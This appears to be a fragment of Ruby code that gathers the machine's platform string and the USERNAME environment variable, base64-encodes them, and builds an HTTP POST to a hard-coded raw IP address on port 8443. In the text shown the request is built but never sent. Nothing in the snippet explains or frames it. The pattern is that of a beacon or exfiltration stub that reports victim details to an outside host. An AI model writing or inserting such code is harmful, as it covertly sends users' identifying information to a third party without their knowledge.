require 'net/http'
require 'base64'
data = Base64.strict_encode64("#{RUBY_PLATFORM}:#{ENV['USERNAME']}")
r = Net::HTTP::Post.new(URI("http://45.9.1.7:8443/submit"))
r.body = data
